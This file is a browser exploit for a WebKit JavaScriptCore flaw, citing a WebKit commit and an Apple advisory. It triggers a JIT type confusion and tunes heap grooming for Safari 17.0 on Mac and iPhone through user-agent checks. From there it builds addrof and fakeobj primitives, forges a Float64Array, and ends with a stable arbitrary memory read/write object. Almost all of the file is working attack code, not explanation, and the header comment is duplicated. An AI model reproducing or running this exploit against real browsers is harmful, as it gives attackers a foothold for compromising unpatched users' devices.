/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}


(function pwn() {
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    let factor;
    let unknown_device = false;

    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }

    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }
    
    function lol() {
        // Spray Float64Array structures so that structure ID 0x5000 will
        // be a Float64Array with very high probability
        // We spray Float64Array first because it's faster
        var structs = [];
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            a['prop' + i] = 1337;
            structs.push(a);
        }
        var float64MemView = new Float64Array(0x200);
        var uint8MemView = new Uint8Array(0x1000);

        // Setup container to host the fake Float64Array
        var jsCellHeader = new Int64([
            00, 0x10, 00, 00,     // m_structureID
            0x0,                  // m_indexingType
            0x2b,                 // m_type
            0x08,                 // m_flags
            0x1                   // m_cellState
        ]);

        var container = {
            jsCellHeader: jsCellHeader.asJSValue(),
            butterfly: null,
            vector: float64MemView,
            length: (new Int64('0x0001000000001337')).asJSValue(),
            mode: {},       // an empty object, we'll need that later
        };

        // Leak address and inject fake object
        // RawAddr == address in float64 form
        var containerRawAddr = addrof(container);
        // var fakeArrayAddr = Add(Int64.fromDouble(containerRawAddr), 16);
        var fakeArrayAddr = Add(containerRawAddr, 16);

        log("[+] Fake Float64Array @ " + fakeArrayAddr);

        ///
        /// BEGIN CRITICAL SECTION
        ///
        /// Objects are corrupted, a GC would now crash the process.
        /// We'll try to repair everything as quickly as possible and with a minimal amount of memory allocations.
        ///
        log("Begin critical section...");
        var driver = fakeobj(fakeArrayAddr.asDouble());

        while (!(driver instanceof Float64Array)) {
            jsCellHeader.assignAdd(jsCellHeader, Int64.One);
            container.jsCellHeader = jsCellHeader.asJSValue();
        }

        // Get some addresses that we'll need to repair our objects. We'll abuse the .mode
        // property of the container to leak addresses.
        driver[2] = containerRawAddr;
        var emptyObjectRawAddr = float64MemView[6];
        container.mode = referenceFloat64Array;
        var referenceFloat64ArrayRawAddr = float64MemView[6];

        // Fixup the JSCell header of the container to make it look like an empty object.
        // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
        driver[2] = emptyObjectRawAddr;
        var header = float64MemView[0];
        driver[2] = containerRawAddr;
        float64MemView[0] = header;

        // Copy the JSCell header from an existing Float64Array and set the butterfly to zero.
        // Also set the mode: make it look like an OversizeTypedArray for easy GC survival
        // (see JSGenericTypedArrayView<Adaptor>::visitChildren).
        driver[2] = referenceFloat64ArrayRawAddr;
        var header = float64MemView[0];
        var length = float64MemView[3];
        var mode = float64MemView[4];
        driver[2] = containerRawAddr;
        float64MemView[2] = header;
        float64MemView[3] = 0;
        float64MemView[5] = length;
        float64MemView[6] = mode;

        // Root the container object so it isn't garbage collected.
        // This will allocate a butterfly for the fake object and store a reference to the container there.
        // The fake array itself is rooted by the memory object (closures).
        driver.container = container;

        log("End critical section.")
        ///
        /// END CRITICAL SECTION
        ///
        /// Objects are repaired, we will now survive a GC
        ///
        if (typeof(gc) !== 'undefined')
            gc();

        memory = {
            read: function(addr, length) {
                driver[2] = memory.addrof(uint8MemView).asDouble();
                float64MemView[2] = addr.asDouble();
                var a = new Array(length);
                for (var i = 0; i < length; i++)
                    a[i] = uint8MemView[i];
                return a;
            },

            write: function(addr, data) {
                driver[2] = memory.addrof(uint8MemView).asDouble();
                float64MemView[2] = addr.asDouble();
                for (var i = 0; i < data.length; i++)
                    uint8MemView[i] = data[i];
            },

            read8: function(addr) {
                driver[2] = addr.asDouble();
                return Int64.fromDouble(float64MemView[0]);
            },

            write8: function(addr, value) {
                driver[2] = addr.asDouble();
                float64MemView[0] = value.asDouble();
            },

            addrof: function(obj) {
                float64MemView.leakme = obj;
                var butterfly = Int64.fromDouble(driver[1]);
                return memory.read8(Sub(butterfly, 0x10));
            },
        };

        log("[+] Got stable memory read/write!");
    }
    
    let sample = BigInt(addrof({}).toString());
    if (sample >= 0x200000000 || sample < 0x100000000) {
        log('failed');
        location.reload();
        return;
    } else {
        log(`success!!!`);
        log(addrof({}).toString());
        log(addrof({}).toString());
        log(addrof({}).toString());
        log(addrof({}).toString());
        lol();
        if (unknown_device) {
            log(`you seems to have found valid factor for an untested device!\nif you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isIphone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
        }
    }
})();